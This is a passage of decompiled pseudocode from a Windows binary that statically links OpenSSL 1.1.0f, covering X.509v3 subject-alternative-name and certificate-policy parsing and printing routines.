              v16 = *(_BYTE *)(v14 + v15++);
              if ( v16 != aMove[v15 - 1] )
                break;
              if ( v15 == 5 )
              {
                v13 = 1;
                goto LABEL_16;
              }
            }
          }
        }
        v17 = sub_1400BB5F0(0i64, a1, a2, v9, 0);
        if ( !v17 )
          break;
        sub_1400297C0(v6, v17);
LABEL_20:
        if ( ++v8 >= (int)sub_1400296E0(a3) )
          return v6;
      }
LABEL_17:
      sub_140029720(v6, (void (*)(void))sub_1400A55D0);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 154, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 280);
    return 0i64;
  }
}

//----- (00000001400BA4A0) ----------------------------------------------------
int *__fastcall sub_1400BA4A0(__int64 a1, __int64 a2, unsigned int *a3)
{
  int *v6; // rdi
  int v8; // ebx
  __int64 v9; // rsi
  __int64 v10; // rdx
  __int64 v11; // rcx
  char v12; // al
  __int64 v13; // rax

  v6 = (int *)sub_1400296C0();
  if ( v6 )
  {
    v8 = 0;
    if ( (int)sub_1400296E0(a3) <= 0 )
    {
      return v6;
    }
    else
    {
      while ( 1 )
      {
        v9 = sub_140029880((__int64)a3, v8);
        if ( !sub_1400B9240(*(const char **)(v9 + 8), "issuer") )
        {
          v10 = *(_QWORD *)(v9 + 16);
          if ( v10 )
          {
            v11 = 0i64;
            while ( 1 )
            {
              v12 = *(_BYTE *)(v10 + v11++);
              if ( v12 != aCopy[v11 - 1] )
                break;
              if ( v11 == 5 )
              {
                if ( (unsigned int)sub_1400BAF70(a2, v6) )
                  goto LABEL_13;
                goto LABEL_10;
              }
            }
          }
        }
        v13 = sub_1400BB5F0(0i64, a1, a2, v9, 0);
        if ( !v13 )
          break;
        sub_1400297C0(v6, v13);
LABEL_13:
        if ( ++v8 >= (int)sub_1400296E0(a3) )
          return v6;
      }
LABEL_10:
      sub_140029720(v6, (void (*)(void))sub_1400A55D0);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 153, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 209);
    return 0i64;
  }
}

//----- (00000001400BA5F0) ----------------------------------------------------
int *__fastcall sub_1400BA5F0(__int64 a1, unsigned int *a2, int *a3)
{
  int i; // esi
  __int64 v6; // rax
  char *v7; // rcx
  char *v8; // rdx
  int v9; // eax
  __int64 v10; // rax
  unsigned __int8 *v11; // rdi
  int v12; // ecx
  int v13; // edx
  __int64 v14; // r9
  int j; // ebx
  char *v16; // rcx
  bool v17; // zf
  _WORD *v18; // rax
  _BYTE v20[32]; // [rsp+0h] [rbp-100h] BYREF
  __int64 v21; // [rsp+20h] [rbp-E0h]
  __int64 v22; // [rsp+28h] [rbp-D8h]
  __int64 v23; // [rsp+30h] [rbp-D0h]
  int *v24; // [rsp+40h] [rbp-C0h] BYREF
  char v25[8]; // [rsp+48h] [rbp-B8h] BYREF
  char v26[256]; // [rsp+50h] [rbp-B0h] BYREF

  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    v6 = sub_140029880((__int64)a2, i);
    v24 = a3;
    switch ( *(_DWORD *)v6 )
    {
      case 0:
        v7 = "othername";
        goto LABEL_4;
      case 1:
        v9 = sub_1400B8500("email", *(_BYTE **)(*(_QWORD *)(v6 + 8) + 8i64), &v24);
        goto LABEL_6;
      case 2:
        v9 = sub_1400B8500("DNS", *(_BYTE **)(*(_QWORD *)(v6 + 8) + 8i64), &v24);
        goto LABEL_6;
      case 3:
        v7 = "X400Name";
        goto LABEL_4;
      case 4:
        if ( !sub_1400A9CD0(*(unsigned int ***)(v6 + 8), v26, 256) )
          goto LABEL_7;
        v8 = v26;
        v7 = "DirName";
        goto LABEL_5;
      case 5:
        v7 = "EdiPartyName";
LABEL_4:
        v8 = "<unsupported>";
        goto LABEL_5;
      case 6:
        v9 = sub_1400B8500("URI", *(_BYTE **)(*(_QWORD *)(v6 + 8) + 8i64), &v24);
        goto LABEL_6;
      case 7:
        v10 = *(_QWORD *)(v6 + 8);
        v11 = *(unsigned __int8 **)(v10 + 8);
        if ( *(_DWORD *)v10 == 4 )
        {
          v12 = v11[2];
          v13 = v11[1];
          v14 = *v11;
          LODWORD(v23) = v11[3];
          LODWORD(v22) = v12;
          LODWORD(v21) = v13;
          sub_14002A5C0(v26, 0x100ui64, "%d.%d.%d.%d", v14, v21, v22, v23);
          v8 = v26;
          v7 = "IP Address";
        }
        else if ( *(_DWORD *)v10 == 16 )
        {
          v26[0] = 0;
          for ( j = 0; j < 8; ++j )
          {
            sub_14002A5C0(v25, 5ui64, "%X", v11[1] | (*v11 << 8));
            v16 = &v20[79];
            v11 += 2;
            do
              v17 = *++v16 == 0;
            while ( !v17 );
            strcpy(v16, v25);
            if ( j != 7 )
            {
              v18 = &v20[79];
              do
              {
                v17 = *((_BYTE *)v18 + 1) == 0;
                v18 = (_WORD *)((char *)v18 + 1);
              }
              while ( !v17 );
              *v18 = 58;
            }
          }
          v8 = v26;
          v7 = "IP Address";
        }
        else
        {
          v8 = "<invalid>";
          v7 = "IP Address";
        }
        goto LABEL_5;
      case 8:
        sub_14003FE60(v26, 256, *(_QWORD *)(v6 + 8));
        v8 = v26;
        v7 = "Registered ID";
LABEL_5:
        v9 = sub_1400B8300(v7, v8, &v24);
LABEL_6:
        if ( v9 )
          a3 = v24;
        else
LABEL_7:
          a3 = 0i64;
        break;
      default:
        continue;
    }
  }
  if ( a3 )
    return a3;
  else
    return (int *)sub_1400296C0();
}
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];
// 1400BA5F0: using guessed type char var_138[8];

//----- (00000001400BA900) ----------------------------------------------------
__int64 __fastcall sub_1400BA900(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v5; // rax
  unsigned __int8 *v6; // rdi
  __int64 v7; // rsi

  switch ( *(_DWORD *)a2 )
  {
    case 0:
      sub_14002A590(a1, "othername:<unsupported>");
      result = 1i64;
      break;
    case 1:
      sub_14002A590(a1, "email:%s", *(const char **)(*(_QWORD *)(a2 + 8) + 8i64));
      result = 1i64;
      break;
    case 2:
      sub_14002A590(a1, "DNS:%s", *(const char **)(*(_QWORD *)(a2 + 8) + 8i64));
      result = 1i64;
      break;
    case 3:
      sub_14002A590(a1, "X400Name:<unsupported>");
      result = 1i64;
      break;
    case 4:
      sub_14002A590(a1, "DirName:");
      sub_14005F0A0(a1, *(unsigned int ***)(a2 + 8), 0, 8520479);
      result = 1i64;
      break;
    case 5:
      sub_14002A590(a1, "EdiPartyName:<unsupported>");
      result = 1i64;
      break;
    case 6:
      sub_14002A590(a1, "URI:%s", *(const char **)(*(_QWORD *)(a2 + 8) + 8i64));
      result = 1i64;
      break;
    case 7:
      v5 = *(_QWORD *)(a2 + 8);
      v6 = *(unsigned __int8 **)(v5 + 8);
      if ( *(_DWORD *)v5 == 4 )
      {
        sub_14002A590(a1, "IP Address:%d.%d.%d.%d", *v6, v6[1], v6[2], v6[3]);
        result = 1i64;
      }
      else if ( *(_DWORD *)v5 == 16 )
      {
        sub_14002A590(a1, "IP Address");
        v7 = 8i64;
        do
        {
          sub_14002A590(a1, ":%X", v6[1] | (*v6 << 8));
          v6 += 2;
          --v7;
        }
        while ( v7 );
        sub_14002A1A0(a1, (__int64)"\n");
        result = 1i64;
      }
      else
      {
        sub_14002A590(a1, "IP Address:<invalid>");
        result = 1i64;
      }
      break;
    case 8:
      sub_14002A590(a1, "Registered ID:");
      sub_14003FD20(a1, *(_QWORD *)(a2 + 8));
      goto LABEL_17;
    default:
LABEL_17:
      result = 1i64;
      break;
  }
  return result;
}

//----- (00000001400BAB70) ----------------------------------------------------
__int64 __fastcall sub_1400BAB70(__int64 a1, __int64 a2, __int64 a3, int a4, char *a5, int a6)
{
  int v6; // eax
  __int64 result; // rax
  __int64 v11; // rbx
  char **v12; // rax
  __int64 v13; // rax
  _DWORD *v14; // rax
  unsigned int v15; // r8d
  char *i; // rcx

  if ( !a5 )
  {
    sub_140024610(v6 - 14, v6 + 116, v6 + 76, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 402);
    return 0i64;
  }
  if ( a1 )
  {
    v11 = a1;
    goto LABEL_5;
  }
  v11 = sub_1400A55F0();
  if ( v11 )
  {
LABEL_5:
    switch ( a4 )
    {
      case 0:
        if ( sub_1400BB160(v11, a5, a3) )
          goto LABEL_25;
        sub_140024610(34, 164, 147, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 456);
        goto LABEL_28;
      case 1:
      case 2:
      case 6:
        v14 = sub_14004FE30();
        *(_QWORD *)(v11 + 8) = v14;
        if ( v14 )
        {
          v15 = 0;
          for ( i = a5; *i; ++v15 )
          {
            if ( v15 >= 0x80000000 )
              break;
            ++i;
          }
          if ( (unsigned int)sub_1400475D0((__int64)v14, a5, v15 & 0x7FFFFFFF) )
            goto LABEL_25;
        }
        sub_140024610(34, 164, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 469);
        goto LABEL_28;
      case 4:
        if ( (unsigned int)sub_1400BB090(v11, (__int64)a5, a3) )
          goto LABEL_25;
        sub_140024610(34, 164, 149, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 449);
        goto LABEL_28;
      case 7:
        if ( a6 )
          v13 = (__int64)sub_1400B8BC0(a5);
        else
          v13 = sub_1400B8AA0(a5);
        *(_QWORD *)(v11 + 8) = v13;
        if ( !v13 )
        {
          sub_140024610(34, 164, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 441);
          sub_140023A40(2, "value=", a5);
          goto LABEL_28;
        }
LABEL_25:
        *(_DWORD *)v11 = a4;
        return v11;
      case 8:
        v12 = sub_14002C840(a5, 0);
        if ( v12 )
        {
          *(_QWORD *)(v11 + 8) = v12;
          result = v11;
          *(_DWORD *)v11 = a4;
          return result;
        }
        sub_140024610(34, 164, 119, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 427);
        sub_140023A40(2, "value=", a5);
LABEL_28:
        if ( !a1 )
          sub_1400A55D0((unsigned int *)v11);
        break;
      default:
        sub_140024610(34, 164, 167, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 461);
        goto LABEL_28;
    }
    return 0i64;
  }
  sub_140024610(34, 164, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 411);
  return 0i64;
}
// 1400BABB3: variable 'v6' is possibly undefined

//----- (00000001400BADF0) ----------------------------------------------------
__int64 __fastcall sub_1400BADF0(__int64 a1, int *a2, int a3)
{
  __int64 v3; // rsi
  unsigned int *v4; // rbx
  unsigned int **v8; // rax
  __int64 *v9; // rbp
  int v10; // edi
  unsigned int *v11; // rbx
  __int64 v12; // rax
  __int64 v13; // rax

  v3 = 0i64;
  v4 = 0i64;
  if ( !a1 )
    goto LABEL_19;
  if ( *(_DWORD *)a1 == 1 )
    return 1i64;
  if ( !*(_QWORD *)(a1 + 16) )
  {
    if ( *(_QWORD *)(a1 + 24) )
    {
      v8 = (unsigned int **)sub_14001C740(*(_QWORD *)(a1 + 24));
      goto LABEL_9;
    }
LABEL_19:
    sub_140024610(34, 122, 125, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 320);
    goto LABEL_20;
  }
  v8 = (unsigned int **)sub_14005F000(*(_QWORD *)(a1 + 16));
LABEL_9:
  v9 = (__int64 *)v8;
  v10 = sub_1400ABE90(v8, 0x30u, -1);
  if ( v10 < 0 )
    return 1i64;
  while ( 1 )
  {
    v11 = (unsigned int *)sub_1400ABE40(v9, v10);
    v12 = sub_1400AB9F0((__int64)v11);
    v3 = sub_140047450(v12);
    if ( a3 )
    {
      sub_1400ABD30((__int64)v9, v10);
      sub_1400A4C20(v11);
      --v10;
    }
    v4 = 0i64;
    if ( !v3 )
      break;
    v13 = sub_1400A55F0();
    v4 = (unsigned int *)v13;
    if ( !v13 )
      break;
    *(_QWORD *)(v13 + 8) = v3;
    *(_DWORD *)v13 = 1;
    v3 = 0i64;
    if ( !(unsigned int)sub_1400297C0(a2, v13) )
    {
      sub_140024610(34, 122, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 348);
      goto LABEL_20;
    }
    v10 = sub_1400ABE90((unsigned int **)v9, 0x30u, v10);
    if ( v10 < 0 )
      return 1i64;
  }
  sub_140024610(34, 122, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 341);
LABEL_20:
  sub_1400A55D0(v4);
  sub_14004FD70(v3);
  return 0i64;
}
// 1400BAE49: conditional instruction was optimized away because rax.8==0

//----- (00000001400BAF70) ----------------------------------------------------
__int64 __fastcall sub_1400BAF70(__int64 a1, int *a2)
{
  int v2; // eax
  __int64 v5; // rcx
  int v6; // eax
  __int64 v7; // rax
  unsigned int *v8; // rax
  unsigned int *v9; // rdi
  int v10; // ebx
  __int64 v11; // rax

  if ( !a1 )
    goto LABEL_14;
  if ( *(_DWORD *)a1 == 1 )
    return 1i64;
  v5 = *(_QWORD *)(a1 + 8);
  if ( v5 )
  {
    v6 = sub_1400AC960(v5, v2 + 37, -1);
    if ( v6 < 0 )
      return 1i64;
    v7 = sub_1400AC940(*(_QWORD *)(a1 + 8), v6);
    if ( v7 )
    {
      v8 = (unsigned int *)sub_1400BDB80(v7);
      v9 = v8;
      if ( v8 )
      {
        v10 = 0;
        if ( (int)sub_1400296E0(v8) > 0 )
        {
          while ( 1 )
          {
            v11 = sub_140029880((__int64)v9, v10);
            if ( !(unsigned int)sub_1400297C0(a2, v11) )
              break;
            if ( ++v10 >= (int)sub_1400296E0(v9) )
              goto LABEL_10;
          }
          sub_140024610(34, 123, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 258);
          return 0i64;
        }
LABEL_10:
        sub_1400294B0((void **)v9);
        return 1i64;
      }
    }
    sub_140024610(34, 123, 126, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 251);
  }
  else
  {
LABEL_14:
    sub_140024610(34, 123, 127, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 243);
  }
  return 0i64;
}
// 1400BAFB1: variable 'v2' is possibly undefined

//----- (00000001400BB090) ----------------------------------------------------
__int64 __fastcall sub_1400BB090(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned int v3; // esi
  __int64 v5; // rdi
  unsigned int *v8; // rbx
  unsigned int *v9; // rax

  v3 = 0;
  v5 = 0i64;
  v8 = (unsigned int *)sub_1400A4CB0();
  if ( v8 )
  {
    v9 = (unsigned int *)sub_1400BB7F0(a3);
    v5 = (__int64)v9;
    if ( v9 )
    {
      v3 = sub_1400B81E0((__int64)v8, v9, 4097);
      if ( v3 )
      {
        *(_QWORD *)(a1 + 8) = v8;
        goto LABEL_5;
      }
    }
    else
    {
      sub_140024610(34, 144, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 561);
      sub_140023A40(2, "section=", a2);
    }
  }
  sub_1400A4C80(v8);
LABEL_5:
  sub_1400BB850(a3, v5);
  return v3;
}

//----- (00000001400BB160) ----------------------------------------------------
_BOOL8 __fastcall sub_1400BB160(__int64 a1, char *a2, __int64 a3)
{
  int v3; // eax
  char *v7; // rbx
  __int64 v9; // rax
  unsigned int *v10; // rax
  char *v11; // rax
  char *v12; // rbx

  v7 = strchr(a2, v3 + 27);
  if ( !v7 )
    return 0i64;
  v9 = sub_1400A5610();
  *(_QWORD *)(a1 + 8) = v9;
  if ( !v9 )
    return 0i64;
  sub_14004FF20(*(unsigned int **)(v9 + 8));
  v10 = sub_1400B70B0(v7 + 1, a3);
  *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8i64) = v10;
  if ( !v10 )
    return 0i64;
  v11 = sub_14003BBE0(a2, (int)v7 - (int)a2);
  v12 = v11;
  if ( !v11 )
    return 0i64;
  **(_QWORD **)(a1 + 8) = sub_14002C840(v11, 0);
  sub_14001D930(v12);
  return **(_QWORD **)(a1 + 8) != 0i64;
}
// 1400BB186: variable 'v3' is possibly undefined

//----- (00000001400BB240) ----------------------------------------------------
int *__fastcall sub_1400BB240(__int64 a1, int *a2, int *a3)
{
  int v3; // eax
  char *v4; // rcx
  char *v5; // rdx
  int v6; // eax
  __int64 v8; // rax
  unsigned __int8 *v9; // rdi
  int v10; // ecx
  int v11; // edx
  __int64 v12; // r9
  int v13; // ebx
  char *v14; // rax
  bool v15; // zf
  _WORD *v16; // rcx
  _BYTE v17[32]; // [rsp+0h] [rbp-168h] BYREF
  __int64 v18; // [rsp+20h] [rbp-148h]
  __int64 v19; // [rsp+28h] [rbp-140h]
  __int64 v20; // [rsp+30h] [rbp-138h]
  int *v21; // [rsp+40h] [rbp-128h] BYREF
  char v22[8]; // [rsp+48h] [rbp-120h] BYREF
  char v23[256]; // [rsp+50h] [rbp-118h] BYREF

  v3 = *a2;
  v21 = a3;
  switch ( v3 )
  {
    case 0:
      v4 = "othername";
      goto LABEL_3;
    case 1:
      v6 = sub_1400B8500("email", *(_BYTE **)(*((_QWORD *)a2 + 1) + 8i64), &v21);
      goto LABEL_5;
    case 2:
      v6 = sub_1400B8500("DNS", *(_BYTE **)(*((_QWORD *)a2 + 1) + 8i64), &v21);
      goto LABEL_5;
    case 3:
      v4 = "X400Name";
      goto LABEL_3;
    case 4:
      if ( !sub_1400A9CD0(*((unsigned int ***)a2 + 1), v23, 256) )
        return 0i64;
      v5 = v23;
      v4 = "DirName";
      goto LABEL_4;
    case 5:
      v4 = "EdiPartyName";
LABEL_3:
      v5 = "<unsupported>";
      goto LABEL_4;
    case 6:
      v6 = sub_1400B8500("URI", *(_BYTE **)(*((_QWORD *)a2 + 1) + 8i64), &v21);
      goto LABEL_5;
    case 7:
      v8 = *((_QWORD *)a2 + 1);
      v9 = *(unsigned __int8 **)(v8 + 8);
      if ( *(_DWORD *)v8 == 4 )
      {
        v10 = v9[2];
        v11 = v9[1];
        v12 = *v9;
        LODWORD(v20) = v9[3];
        LODWORD(v19) = v10;
        LODWORD(v18) = v11;
        sub_14002A5C0(v23, 0x100ui64, "%d.%d.%d.%d", v12, v18, v19, v20);
        v5 = v23;
        v4 = "IP Address";
      }
      else if ( *(_DWORD *)v8 == 16 )
      {
        v13 = 0;
        v23[0] = 0;
        do
        {
          sub_14002A5C0(v22, 5ui64, "%X", v9[1] | (*v9 << 8));
          v14 = &v17[79];
          v9 += 2;
          do
            v15 = *++v14 == 0;
          while ( !v15 );
          strcpy(v14, v22);
          if ( v13 != 7 )
          {
            v16 = &v17[79];
            do
            {
              v15 = *((_BYTE *)v16 + 1) == 0;
              v16 = (_WORD *)((char *)v16 + 1);
            }
            while ( !v15 );
            *v16 = 58;
          }
          ++v13;
        }
        while ( v13 < 8 );
        v5 = v23;
        v4 = "IP Address";
      }
      else
      {
        v5 = "<invalid>";
        v4 = "IP Address";
      }
      goto LABEL_4;
    case 8:
      sub_14003FE60(v23, 256, *((_QWORD *)a2 + 1));
      v5 = v23;
      v4 = "Registered ID";
LABEL_4:
      v6 = sub_1400B8300(v4, v5, &v21);
LABEL_5:
      if ( !v6 )
        return 0i64;
      return v21;
    default:
      return a3;
  }
}
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];
// 1400BB240: using guessed type char var_120[8];

//----- (00000001400BB4E0) ----------------------------------------------------
__int64 __fastcall sub_1400BB4E0(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_1400BB5F0(0i64, a1, a2, a3, 0);
}

//----- (00000001400BB510) ----------------------------------------------------
int *__fastcall sub_1400BB510(__int64 a1, __int64 a2, unsigned int *a3)
{
  int *v6; // rdi
  int v8; // ebx
  __int64 v9; // rax
  __int64 v10; // rax

  v6 = (int *)sub_1400296C0();
  if ( v6 )
  {
    v8 = 0;
    if ( (int)sub_1400296E0(a3) <= 0 )
    {
      return v6;
    }
    else
    {
      while ( 1 )
      {
        v9 = sub_140029880((__int64)a3, v8);
        v10 = sub_1400BB5F0(0i64, a1, a2, v9, 0);
        if ( !v10 )
          break;
        sub_1400297C0(v6, v10);
        if ( ++v8 >= (int)sub_1400296E0(a3) )
          return v6;
      }
      sub_140029720(v6, (void (*)(void))sub_1400A55D0);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 118, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 372);
    return 0i64;
  }
}

//----- (00000001400BB5F0) ----------------------------------------------------
__int64 __fastcall sub_1400BB5F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5)
{
  int v5; // eax
  char *v6; // rdi
  const char *v8; // rbx
  int v11; // ecx

  v6 = *(char **)(a4 + 16);
  v8 = *(const char **)(a4 + 8);
  if ( v6 )
  {
    if ( sub_1400B9240(*(const char **)(a4 + 8), "email") )
    {
      if ( sub_1400B9240(v8, "URI") )
      {
        if ( sub_1400B9240(v8, "DNS") )
        {
          if ( sub_1400B9240(v8, "RID") )
          {
            if ( sub_1400B9240(v8, "IP") )
            {
              if ( sub_1400B9240(v8, "dirName") )
              {
                if ( sub_1400B9240(v8, "otherName") )
                {
                  sub_140024610(34, 117, 117, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 515);
                  sub_140023A40(2, "name=", v8);
                  return 0i64;
                }
                v11 = 0;
              }
              else
              {
                v11 = 4;
              }
            }
            else
            {
              v11 = 7;
            }
          }
          else
          {
            v11 = 8;
          }
        }
        else
        {
          v11 = 2;
        }
      }
      else
      {
        v11 = 6;
      }
    }
    else
    {
      v11 = 1;
    }
    return sub_1400BAB70(a1, a2, a3, v11, v6, a5);
  }
  sub_140024610(v5 - 14, v5 + 69, v5 + 76, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_alt.c", 496);
  return 0i64;
}
// 1400BB63F: variable 'v5' is possibly undefined

//----- (00000001400BB770) ----------------------------------------------------
__int64 __fastcall sub_1400BB770(__int64 a1, const char *a2, char *a3)
{
  return sub_14005BE10(a1, a2, a3);
}

//----- (00000001400BB790) ----------------------------------------------------
__int64 __fastcall sub_1400BB790(__int64 a1, __int64 a2)
{
  return sub_14005BD80(a1, a2);
}

//----- (00000001400BB7B0) ----------------------------------------------------
__int64 __fastcall sub_1400BB7B0(__int64 a1, const char *a2, char *a3)
{
  return sub_14005C010(a1, a2, a3);
}

//----- (00000001400BB7D0) ----------------------------------------------------
__int64 __fastcall sub_1400BB7D0(__int64 a1, __int64 a2)
{
  return sub_14005BFA0(a1, a2);
}

//----- (00000001400BB7F0) ----------------------------------------------------
__int64 __fastcall sub_1400BB7F0(__int64 a1)
{
  __int64 v1; // rax
  __int64 (__fastcall *v2)(_QWORD); // r8

  if ( *(_QWORD *)(a1 + 48) )
  {
    v1 = *(_QWORD *)(a1 + 40);
    if ( v1 )
    {
      v2 = *(__int64 (__fastcall **)(_QWORD))(v1 + 8);
      if ( v2 )
        return v2(*(_QWORD *)(a1 + 48));
    }
  }
  sub_140024610(34, 142, 148, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_conf.c", 381);
  return 0i64;
}

//----- (00000001400BB850) ----------------------------------------------------
__int64 __fastcall sub_1400BB850(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 (__fastcall *v3)(_QWORD); // r8

  if ( a2 )
  {
    result = *(_QWORD *)(a1 + 40);
    v3 = *(__int64 (__fastcall **)(_QWORD))(result + 24);
    if ( v3 )
      return v3(*(_QWORD *)(a1 + 48));
  }
  return result;
}

//----- (00000001400BB880) ----------------------------------------------------
__int64 __fastcall sub_1400BB880(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4)
{
  int i; // r15d
  __int64 *v8; // rbx
  unsigned int *v9; // r14
  unsigned int *v10; // rcx
  int v11; // ebx
  __int64 *v12; // rsi
  int v13; // eax

  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    v8 = (__int64 *)sub_140029880((__int64)a2, i);
    sub_14002A590(a3, "%*sPolicy: ", a4, byte_1400D7DAE);
    sub_14003FD20(a3, *v8);
    sub_14002A1A0(a3, (__int64)"\n");
    v9 = (unsigned int *)v8[1];
    if ( v9 )
    {
      v10 = (unsigned int *)v8[1];
      v11 = 0;
      if ( (int)sub_1400296E0(v10) > 0 )
      {
        do
        {
          v12 = (__int64 *)sub_140029880((__int64)v9, v11);
          v13 = sub_14002C260(*v12) - 164;
          if ( v13 )
          {
            if ( v13 == 1 )
            {
              sub_14002A590(a3, "%*sUser Notice:\n", a4 + 2, byte_1400D7DAE);
              sub_1400BC4E0(a3, v12[1], a4 + 4);
            }
            else
            {
              sub_14002A590(a3, "%*sUnknown Qualifier: ", a4 + 4, byte_1400D7DAE);
              sub_14003FD20(a3, *v12);
              sub_14002A1A0(a3, (__int64)"\n");
            }
          }
          else
          {
            sub_14002A590(a3, "%*sCPS: %s\n", a4 + 2, byte_1400D7DAE, *(_QWORD *)(v12[1] + 8));
          }
          ++v11;
        }
        while ( v11 < (int)sub_1400296E0(v9) );
      }
    }
  }
  return 1i64;
}

//----- (00000001400BBA10) ----------------------------------------------------
int *__fastcall sub_1400BBA10(__int64 a1, __int64 a2, _BYTE *a3)
{
  int *v5; // r12
  int *v7; // rax
  unsigned int *v8; // rbp
  int v9; // r15d
  int v10; // esi
  __int64 v11; // rax
  _QWORD *v12; // rbx
  char *v13; // r8
  __int64 v14; // rcx
  char v15; // al
  unsigned int *v16; // rax
  __int64 v17; // rdi
  unsigned int *v18; // rbx
  char **v19; // rdi
  unsigned int *v20; // rax

  v5 = (int *)sub_1400296C0();
  if ( !v5 )
  {
    sub_140024610(34, 130, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 98);
    return 0i64;
  }
  v7 = sub_1400B8890(a3);
  v8 = (unsigned int *)v7;
  if ( v7 )
  {
    v9 = 0;
    v10 = 0;
    if ( (int)sub_1400296E0((unsigned int *)v7) > 0 )
    {
      while ( 2 )
      {
        v11 = sub_140029880((__int64)v8, v10);
        v12 = (_QWORD *)v11;
        if ( *(_QWORD *)(v11 + 16) || (v13 = *(char **)(v11 + 8)) == 0i64 )
        {
          sub_140024610(34, 130, 134, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 111);
LABEL_27:
          sub_140023A40(6, "section:", *v12, ",name:", v12[1], ",value:", v12[2]);
          goto LABEL_28;
        }
        v14 = 0i64;
        while ( 1 )
        {
          v15 = v13[v14++];
          if ( v15 != aIa5org[v14 - 1] )
            break;
          if ( v14 == 7 )
          {
            v9 = 1;
            goto LABEL_20;
          }
        }
        if ( *v13 == 64 )
        {
          v16 = (unsigned int *)sub_1400BB7F0(a2);
          v17 = (__int64)v16;
          if ( !v16 )
          {
            sub_140024610(34, 130, 135, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 123);
            goto LABEL_27;
          }
          v18 = (unsigned int *)sub_1400BC1E0(a2, v16, v9);
          sub_1400BB850(a2, v17);
          if ( !v18 )
            goto LABEL_28;
        }
        else
        {
          v19 = sub_14002C840(v13, 0);
          if ( !v19 )
          {
            sub_140024610(34, 130, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 135);
            goto LABEL_27;
          }
          v20 = (unsigned int *)sub_140050B70((__int64)&unk_1401226B0);
          v18 = v20;
          if ( !v20 )
          {
            sub_140024610(34, 130, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 141);
            sub_14003F4D0((__int64)v19);
            goto LABEL_28;
          }
          *(_QWORD *)v20 = v19;
        }
        if ( !(unsigned int)sub_1400297C0(v5, (__int64)v18) )
        {
          sub_140051250(v18, (__int64)&unk_1401226B0);
          sub_140024610(34, 130, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 149);
          goto LABEL_28;
        }
LABEL_20:
        if ( ++v10 < (int)sub_1400296E0(v8) )
          continue;
        break;
      }
    }
    sub_140029720(v8, (void (*)(void))sub_1400B8520);
    return v5;
  }
  sub_140024610(34, 130, 34, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 103);
LABEL_28:
  sub_140029720(v8, (void (*)(void))sub_1400B8520);
  sub_140029720(v5, (void (*)(void))sub_1400BBD50);
  return 0i64;
}

//----- (00000001400BBCF0) ----------------------------------------------------
void *sub_1400BBCF0()
{
  return &unk_140122638;
}

//----- (00000001400BBD00) ----------------------------------------------------
void *sub_1400BBD00()
{
  return &unk_1401226B0;
}

//----- (00000001400BBD10) ----------------------------------------------------
void *sub_1400BBD10()
{
  return &unk_1401227C0;
}

//----- (00000001400BBD20) ----------------------------------------------------
void *sub_1400BBD20()
{
  return &unk_140122830;
}

//----- (00000001400BBD30) ----------------------------------------------------
void *sub_1400BBD30()
{
  return &unk_1401228A0;
}

//----- (00000001400BBD40) ----------------------------------------------------
void *sub_1400BBD40()
{
  return &unk_140122750;
}

//----- (00000001400BBD50) ----------------------------------------------------
void __fastcall sub_1400BBD50(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_1401226B0);
}

//----- (00000001400BBD70) ----------------------------------------------------
void __fastcall sub_1400BBD70(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_1401227C0);
}

//----- (00000001400BBD90) ----------------------------------------------------
__int64 __fastcall sub_1400BBD90(__int64 a1, unsigned int *a2, int a3)
{
  __int64 v5; // r15
